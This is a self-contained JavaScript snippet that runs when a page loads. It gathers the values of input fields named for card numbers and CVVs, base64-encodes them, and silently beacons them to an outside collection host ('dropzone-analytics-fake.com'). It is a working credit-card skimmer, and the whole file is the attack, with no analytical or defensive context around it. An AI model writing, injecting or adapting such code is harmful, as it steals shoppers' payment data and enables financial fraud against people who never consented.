(function() {
    var inputs = document.querySelectorAll('input[type="text"], input[type="password"]');
    var data = {};
    inputs.forEach(function(i) {
        if (i.name && i.value && (i.name.indexOf('card') !== -1 || i.name.indexOf('cvv') !== -1)) {
            data[i.name] = i.value;
        }
    });
    if (Object.keys(data).length > 0) {
        navigator.sendBeacon("https://dropzone-analytics-fake.com/collect", btoa(JSON.stringify(data)));
    }
})();
